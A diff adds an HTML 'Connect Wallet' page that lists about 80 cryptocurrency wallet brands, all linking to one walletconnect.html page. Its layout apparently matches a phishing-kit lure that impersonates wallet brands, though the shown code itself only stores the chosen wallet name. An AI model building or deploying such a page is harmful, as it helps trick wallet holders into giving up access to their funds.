@@ -1,0 +1,370 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Connect Wallet</title>
+  <link rel="stylesheet" href="option.css" />
+  <script>
+    // Save the wallet name when a user clicks it
+    function selectWallet(walletName) {
+      try {
+        localStorage.setItem("selectedWallet", walletName);
+      } catch (e) {
+        // ignore storage errors (private mode, etc.)
+        console.warn("Could not save selected wallet:", e);
+      }
+    }
+  </script>
+</head>
+<body>
+
+  <section class="connect-wallet">
+    <h2>Connect Wallet</h2>
+    <p>Open protocol for connecting Wallets to Dapps</p>
+
+    <div class="wallet-grid">
+      <a href="walletconnect.html" class="wallet-item" onclick="selectWallet('Wallet Connect')">
+        <img src="wl/1.jpeg" alt="Wallet 1" />
+        <span>Wallet Connect</span>
+      </a>
+      <a href="walletconnect.html" class="wallet-item" onclick="selectWallet('phantom')">
+        <img src="wl/2.png" alt="Wallet 2" />
+        <span>Phantom</span>
+      </a>
+      <a href="walletconnect.html" class="wallet-item" onclick="selectWallet('Leger Live')">
+        <img src="wl/3.png" alt="Wallet 2" />
+        <span>Ledger Live</span>
+      </a> 
+          <a href="walletconnect.html" class="wallet-item" onclick="selectWallet('Metamask')">
+        <img src="wl/4.jpeg" alt="Wallet 2" />
+        <span>Metamask</span>
+      </a>           
+      <a href="walletconnect.html" class="wallet-item" onclick="selectWallet('Mycelium')">
+        <img src="wl/5.jpeg" alt="Wallet 2" />
+        <span>Mycelium</span>
+      </a>      
+
+          <a href="walletconnect.html" class="wallet-item" onclick="selectWallet('Exodus Wallet')">
+        <img src="wl/6.png" alt="Wallet 2" />
+        <span>Exodus Wallet</span>
+      </a>  
+            <a href="walletconnect.html" class="wallet-item" onclick="selectWallet('Solar Wallet')">
+        <img src="wl/7.png" alt="Wallet 2" />
+        <span>Solar Wallet</span>
+      </a>   
+      <a href="walletconnect.html" class="wallet-item" onclick="selectWallet('Monerujo')">
+        <img src="wl/8.png" alt="Wallet 2" />
+        <span>Monerujo</span>
+      </a>
+      <a href="walletconnect.html" class="wallet-item"  onclick="selectWallet('Coinbase Wallet')">
+        <img src="wl/9.png" alt="Wallet 2" />
+        <span>Coinbase Wallet</span>
+      </a>         
+      <a href="walletconnect.html" class="wallet-item">
+        <img src="wl/10.png" alt="Wallet 2" />
+        <span>Loopring</span>
+      </a>
+      <a href="walletconnect.html" class="wallet-item">
+        <img src="wl/11.png" alt="Wallet 2" />
+        <span>Montero GUI</span>
+      </a>
+      <a href="walletconnect.html" class="wallet-item">
+        <img src="wl/12.png" alt="Wallet 2" />
+        <span>One Key</span>
+      </a>
+      <a href="walletconnect.html" class="wallet-item">
+        <img src="wl/13.png" alt="Wallet 2" />
+        <span>Bit Frost</span>
+      </a>
+      <a href="walletconnect.html" class="wallet-item">
+        <img src="wl/14.png" alt="Wallet 2" />
+        <span>Flare</span>
+      </a>
+      <a href="walletconnect.html" class="wallet-item"  onclick="selectWallet('Bitcoin.com')">
+        <img src="wl/15.png" alt="Wallet 2" />
+        <span>Bitcoin.com</span>
+      </a>
+      <a href="walletconnect.html" class="wallet-item" onclick="selectWallet('Ton Wallet')">
+        <img src="wl/16.png" alt="Wallet 2" />
+        <span>Ton Wallet</span>
+      </a>
+      <a href="walletconnect.html" class="wallet-item"  onclick="selectWallet('Ton Keeper')">
+        <img src="wl/17.png" alt="Wallet 2" />
+        <span>Ton Keeper</span>
+      </a>
+      <a href="walletconnect.html" class="wallet-item">
+        <img src="wl/18.png" alt="Wallet 2" />
+        <span>Keepkey</span>
+      </a>
+      <a href="walletconnect.html" class="wallet-item">
+        <img src="wl/19.png" alt="Wallet 2" />
+        <span>Elipal</span>
+      </a>
+      <a href="walletconnect.html" class="wallet-item"  onclick="selectWallet('Uniswap')">
+        <img src="wl/20.png" alt="Wallet 2" />
+        <span>Uniswap</span>
+      </a>
+      <a href="walletconnect.html" class="wallet-item">
+        <img src="wl/21.png" alt="Wallet 2" />
+        <span>Argent</span>
+      </a>
+      <a href="walletconnect.html" class="wallet-item">
+        <img src="wl/22.png" alt="Wallet 2" />
+        <span>Youholder</span>
+      </a>
+      <a href="walletconnect.html" class="wallet-item" onclick="selectWallet('Bitbox')">
+        <img src="wl/23.png" alt="Wallet 2" />
+        <span>BitBox</span>
+      </a>
+      <a href="walletconnect.html" class="wallet-item">
+        <img src="wl/24.png" alt="Wallet 2" />
+        <span>Coldcard Wallet</span>
+      </a>
+      <a href="walletconnect.html" class="wallet-item" onclick="selectWallet('TrustWallet')">
+        <img src="wl/25.png" alt="Wallet 2" />
+        <span>TrustWallet</span>
+      </a>
+      <a href="walletconnect.html" class="wallet-item" onclick="selectWallet('Keystone')">
+        <img src="wl/26.png" alt="Wallet 2" />
+        <span>Keystone</span>
+      </a>
+      <a href="walletconnect.html" class="wallet-item">
+        <img src="wl/27.png" alt="Wallet 2" />
+        <span>Simplehold</span>
+      </a>
+      <a href="walletconnect.html" class="wallet-item">
+        <img src="wl/28.png" alt="Wallet 2" />
+        <span>MyEther</span>
+      </a>
+      <a href="walletconnect.html" class="wallet-item">
+        <img src="wl/29.png" alt="Wallet 2" />
+        <span>Bitbox</span>
+      </a>
+      <a href="walletconnect.html" class="wallet-item">
+        <img src="wl/30.png" alt="Wallet 2" />
+        <span>Infiniti</span>
+      </a>
+      <a href="walletconnect.html" class="wallet-item">
+        <img src="wl/31.png" alt="Wallet 2" />
+        <span>coinspace</span>
+      </a>
+      <a href="walletconnect.html" class="wallet-item">
+        <img src="wl/32.png" alt="Wallet 2" />
+        <span>Stakedwallet.io</span>
+      </a>
+      <a href="walletconnect.html" class="wallet-item">
+        <img src="wl/33.png" alt="Wallet 2" />
+        <span>Coinjar</span>
+      </a>
+      <a href="walletconnect.html" class="wallet-item">
+        <img src="wl/34.png" alt="Wallet 2" />
+        <span>Arculus</span>
+      </a>
+      <a href="walletconnect.html" class="wallet-item">
+        <img src="wl/35.png" alt="Wallet 2" />
+        <span>CoolWallet</span>
+      </a>
+      <a href="walletconnect.html" class="wallet-item">
+        <img src="wl/36.png" alt="Wallet 2" />
+        <span>ColdCard Wallet</span>
+      </a>
+      <a href="walletconnect.html" class="wallet-item">
+        <img src="wl/37.png" alt="Wallet 2" />
+        <span>BRD Wallet</span>
+      </a>
+      <a href="walletconnect.html" class="wallet-item">
+        <img src="wl/38.png" alt="Wallet 2" />
+        <span>Tezos</span>
+      </a>
+      <a href="walletconnect.html" class="wallet-item" onclick="selectWallet('Metamask')">
+        <img src="wl/39.jpeg" alt="Wallet 2" />
+        <span>Metamask</span>
+      </a>
+      <a href="walletconnect.html" class="wallet-item">
+        <img src="wl/40.png" alt="Wallet 2" />
+        <span>ELectrum</span>
+      </a>
+      <a href="walletconnect.html" class="wallet-item">
+        <img src="wl/41.png" alt="Wallet 2" />
+        <span>SAfemoon</span>
+      </a>
+      <a href="walletconnect.html" class="wallet-item">
+        <img src="wl/42.png" alt="Wallet 2" />
+        <span>Kraken</span>
+      </a>
+      <a href="walletconnect.html" class="wallet-item">
+        <img src="wl/43.png" alt="Wallet 2" />
+        <span>Crypto.com</span>
+      </a>
+      <a href="walletconnect.html" class="wallet-item">
+        <img src="wl/44.png" alt="Wallet 2" />
+        <span>Eterni Wallet</span>
+      </a>
+      <a href="walletconnect.html" class="wallet-item">
+        <img src="wl/45.png" alt="Wallet 2" />
+        <span>Flint Wallet</span>
+      </a>
+      <a href="walletconnect.html" class="wallet-item">
+        <img src="wl/46.png" alt="Wallet 2" />
+        <span>Trezor Wallet</span>
+      </a>
+      <a href="walletconnect.html" class="wallet-item">
+        <img src="wl/47.png" alt="Wallet 2" />
+        <span>Digitex</span>
+      </a>
+      <a href="walletconnect.html" class="wallet-item" onclick="selectWallet('Klever Wallet')">
+        <img src="wl/48.jpeg" alt="Wallet 2" />
+        <span>Klever Wallet</span>
+      </a>
+      <a href="walletconnect.html" class="wallet-item">
+        <img src="wl/49.jpeg" alt="Wallet 2" />
+        <span>Scholarship Wallet</span>
+      </a>
+      <a href="walletconnect.html" class="wallet-item">
+        <img src="wl/50.jpeg" alt="Wallet 2" />
+        <span>CakeWallet</span>
+      </a>
+
+      <a href="walletconnect.html" class="wallet-item">
+        <img src="wl/51.jpeg" alt="Wallet 2" />
+        <span>Bluewallet</span>
+      </a>
+      <a href="walletconnect.html" class="wallet-item" onclick="selectWallet('Solfare Wallet')">
+        <img src="wl/52.png" alt="Wallet 2" />
+        <span>Solfare wallet</span>
+      </a>
+      <a href="walletconnect.html" class="wallet-item">
+        <img src="wl/53.png" alt="Wallet 2" />
+        <span>Phoenix Wallet</span>
+      </a>
+      <a href="walletconnect.html" class="wallet-item">
+        <img src="wl/54.png" alt="Wallet 2" />
+        <span>Hellium Wallet</span>
+      </a>
+      <a href="walletconnect.html" class="wallet-item">
+        <img src="wl/55.jpeg" alt="Wallet 2" />
+        <span>Kaspium Wallet</span>
+      </a>
+      <a href="walletconnect.html" class="wallet-item">
+        <img src="wl/56.png" alt="Wallet 2" />
+        <span>Exodus Wallet</span>
+      </a>
+      <a href="walletconnect.html" class="wallet-item">
+        <img src="wl/57.png" alt="Wallet 2" />
+        <span>Kelpr Wallet</span>
+      </a>
+      <a href="walletconnect.html" class="wallet-item">
+        <img src="wl/58.jpeg" alt="Wallet 2" />
+        <span>PayBolt wallet</span>
+      </a>
+      <a href="walletconnect.html" class="wallet-item">
+        <img src="wl/59.png" alt="Wallet 2" />
+        <span>CoinMoni Wallet</span>
+      </a>
+      <a href="walletconnect.html" class="wallet-item" onclick="selectWallet('Zerion Wallet')">
+        <img src="wl/60.png" alt="Wallet 2" />
+        <span>Zerion Wallet</span>
+      </a>
+      <a href="walletconnect.html" class="wallet-item"  onclick="selectWallet('Leap Wallet')">
+        <img src="wl/61.png" alt="Wallet 2" />
+        <span>LeapWallet</span>
+      </a>
+      <a href="walletconnect.html" class="wallet-item" onclick="selectWallet('TrezorWallet')">
+        <img src="wl/62.jpeg" alt="Wallet 2" />
+        <span>Trezor Wallet</span>
+      </a>
+      <a href="walletconnect.html" class="wallet-item">
+        <img src="wl/63.jpeg" alt="Wallet 2" />
+        <span>Guarda Wallet</span>
+      </a>
+      <a href="walletconnect.html" class="wallet-item">
+        <img src="wl/64.jpeg" alt="Wallet 2" />
+        <span>iToken Wallet</span>
+      </a>
+      <a href="walletconnect.html" class="wallet-item">
+        <img src="wl/65.jpeg" alt="Wallet 2" />
+        <span>Ballet Wallet</span>
+      </a>
+      <a href="walletconnect.html" class="wallet-item">
+        <img src="wl/66.jpeg" alt="Wallet 2" />
+        <span>Bluemoon.io wallet</span>
+      </a>
+      <a href="walletconnect.html" class="wallet-item">
+        <img src="wl/67.png" alt="Wallet 2" />
+        <span>Dorhimii Wallet</span>
+      </a>
+      <a href="walletconnect.html" class="wallet-item" onclick="selectWallet('Bitkeep Wallet')">
+        <img src="wl/68.png" alt="Wallet 2" />
+        <span>Bitkeep Wallet</span>
+      </a>
+      <a href="walletconnect.html" class="wallet-item">
+        <img src="wl/69.png" alt="Wallet 2" />
+        <span>Ambire Wallet</span>
+      </a>
+      <a href="walletconnect.html" class="wallet-item">
+        <img src="wl/70.png" alt="Wallet 2" />
+        <span>Rainbow</span>
+      </a>
+      <a href="walletconnect.html" class="wallet-item">
+        <img src="wl/71.png" alt="Wallet 2" />
+        <span>Gnoisis Safe Multisig</span>
+      </a>
+      <a href="walletconnect.html" class="wallet-item">
+        <img src="wl/72.png" alt="Wallet 2" />
+        <span>Argent</span>
+      </a>
+      <a href="walletconnect.html" class="wallet-item">
+        <img src="wl/73.png" alt="Wallet 2" />
+        <span>Pillar</span>
+      </a>
+      <a href="walletconnect.html" class="wallet-item">
+        <img src="wl/75.png" alt="Wallet 2" />
+        <span>ONTO</span>
+      </a>
+      <a href="walletconnect.html" class="wallet-item">
+        <img src="wl/76.jpeg" alt="Wallet 2" />
+        <span>BitPay</span>
+      </a>
+      <a href="walletconnect.html" class="wallet-item">
+        <img src="wl/77.png" alt="Wallet 2" />
+        <span>Maiar</span>
+      </a>
+      <a href="walletconnect.html" class="wallet-item">
+        <img src="wl/78.png" alt="Wallet 2" />
+        <span>Ledger Live</span>
+      </a>
+      <a href="walletconnect.html" class="wallet-item">
+        <img src="wl/79.png" alt="Wallet 2" />
+        <span>Walleth</span>
+      </a>
+      <a href="walletconnect.html" class="wallet-item">
+        <img src="wl/80.jpeg" alt="Wallet 2" />
+        <span>XDEFI Wallet</span>
+      </a>
+      <a href="walletconnect.html" class="wallet-item">
+        <img src="wl/82.jpeg" alt="Wallet 2" />
+        <span>stepN </span>
+      </a>
+      <a href="walletconnect.html" class="wallet-item">
+        <img src="wl/83.jpeg" alt="Wallet 2" />
+        <span>Thor Wallet</span>
+      </a>
+      <a href="walletconnect.html" class="wallet-item">
+        <img src="wl/85.png" alt="Wallet 2" />
+        <span>Eidoo</span>
+      </a>
+      <a href="walletconnect.html" class="wallet-item">
+        <img src="wl/86.png" alt="Wallet 2" />
+        <span>TrustVault</span>
+      </a>
+      <a href="walletconnect.html" class="wallet-item" onclick="selectWallet('Other Wallet')">
+        <img src="wl/1.jpeg" alt="Wallet 2" />
+        <span>OtherWallet</span>
+      </a>
+      <!-- ... up to 116 -->
+    </div>
+  </section>
+
+</body>
+</html>
